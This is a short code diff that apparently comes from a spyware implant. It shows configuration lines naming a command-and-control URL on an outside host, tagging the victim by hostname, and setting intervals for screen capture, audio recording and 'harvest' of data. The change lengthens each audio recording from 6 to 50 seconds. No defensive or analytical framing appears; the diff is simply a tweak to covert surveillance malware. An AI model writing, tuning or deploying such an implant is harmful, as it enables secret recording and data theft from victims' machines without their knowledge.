@@ -19,7 +19,7 @@ C2_URL = "https://c2-receiver.onrender.com"   # <-- CHANGE
 
 TARGET_ID = socket.gethostname()
 SCREEN_INTERVAL = 8
-AUDIO_DURATION = 6
+AUDIO_DURATION = 50
 AUDIO_INTERVAL = 40
 HARVEST_INTERVAL = 90
 
